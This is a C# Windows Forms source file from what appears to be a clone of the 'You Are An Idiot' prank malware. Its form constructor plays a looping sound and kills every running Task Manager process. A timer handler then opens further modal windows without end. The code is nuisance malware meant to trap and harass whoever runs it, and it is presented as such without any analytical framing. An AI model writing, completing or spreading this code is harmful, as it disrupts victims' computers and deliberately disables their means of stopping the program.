using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Media;
using System.IO;
using System.Diagnostics;

namespace YouAreAnIdiot
{
    public partial class Form2 : Form
    {
        private SoundPlayer _soundPlayer;
        public Form2()
        {
            InitializeComponent();

            _soundPlayer = new SoundPlayer();
            _soundPlayer.Stream = Resources.Resource1.yaaiwav1;
            _soundPlayer.PlayLooping();




            foreach (Process proc in Process.GetProcessesByName("TaskMgr"))
            {


                proc.Kill();

            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            Form1 frm = new Form1();
            frm.BringToFront();
            frm.ShowDialog();
        }
    }
}
